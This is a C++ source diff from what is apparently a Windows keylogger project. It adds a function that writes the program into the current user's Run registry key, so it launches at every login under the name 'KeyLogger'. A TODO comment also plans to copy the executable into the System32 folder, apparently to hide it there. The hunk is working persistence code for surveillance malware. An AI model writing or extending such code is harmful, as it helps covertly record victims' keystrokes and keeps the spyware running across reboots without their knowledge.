@@ -57,4 +57,52 @@ void logFile(ofstream& outFile, string msg) {
 	#endif
 }
 
+BOOL registerStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args) {
+	HKEY hKey = NULL;
+	LONG lResult = 0;
+	BOOL fSuccess = TRUE;
+	DWORD dwSize;
+
+	const size_t count = MAX_PATH * 2;
+	wchar_t szValue[count] = {};
+
+
+	wcscpy_s(szValue, count, L"\"");
+	wcscat_s(szValue, count, pathToExe);
+	wcscat_s(szValue, count, L"\" ");
+
+	if (args != NULL)
+	{
+		// caller should make sure "args" is quoted if any single argument has a space
+		// e.g. (L"-name \"Mark Voidale\"");
+		wcscat_s(szValue, count, args);
+	}
+
+	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);
+
+	fSuccess = (lResult == 0);
+
+	if (fSuccess)
+	{
+		dwSize = (wcslen(szValue) + 1) * 2;
+		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
+		fSuccess = (lResult == 0);
+	}
+
+	if (hKey != NULL)
+	{
+		RegCloseKey(hKey);
+		hKey = NULL;
+	}
+
+	return fSuccess;
+}
+
+void registerProgram() {
+	wchar_t szPathToExe[MAX_PATH];
+	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
+	// TODO copy KeyLogger.exe to C:\Windows\System32 and register C:\Windows\System32\KeyLogger.exe
+	registerStartup(L"KeyLogger", szPathToExe, NULL);
+}
+
 
